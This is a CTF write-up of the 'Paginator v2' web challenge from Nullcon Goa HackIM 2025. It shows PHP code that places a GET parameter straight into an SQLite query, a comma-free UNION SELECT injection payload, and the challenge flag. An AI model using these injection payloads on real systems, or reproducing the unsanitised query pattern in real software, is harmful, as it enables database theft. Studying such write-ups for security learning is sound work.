---
title: "Paginator v2 - Nullcon Goa HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "union-select", "base64", "exec", "sqlite", "paginator", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "exec(\"CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)\");"
source:
  name: "CTFtime writeup #39949"
  url: "https://ctftime.org/writeup/39949"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Paginator v2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Paginator v2
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/39949>

---
# Paginator V2

### Application 

```  
exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");  
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");  
} catch (Exception $e) {  
// var_dump($e);  
}

if (isset($_GET['p']) && str_contains($_GET['p'], ",")) {  
[$min, $max] = explode(",", $_GET['p']);  
if (intval($min) <= 1) {  
die("This post is not accessible...");  
}  
try {  
$q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";  
$result = $db->query($q);  
while ($row = $result->fetchArray(SQLITE3_ASSOC)) {  
echo $row['title'] . " (ID=" . $row['id'] . ") has content: \"" . $row['content'] . "\"  
";  
}  
} catch (Exception $e) {  
echo "Try harder!";  
}  
} else {  
echo "Try harder!";  
}?>  
```

The code is very similar to Paginator V1 but the only difference is that the flag is not in the current database.

### Vulnerability

We need to find a workaround to bypass commas so after a bit research 

<https://hacktricks.boitatech.com.br/pentesting-web/sql-injection#waf-bypass>

`SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT name from sql_master)a JOIN (SELECT null from pages)b JOIN (SELECT null from pages)c JOIN (SELECT null from pages)d`

So we implement this logic to get flag

`?p=2,10 UNION SELECT * FROM flag`

This is will flag in base64 encoded

`ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}`
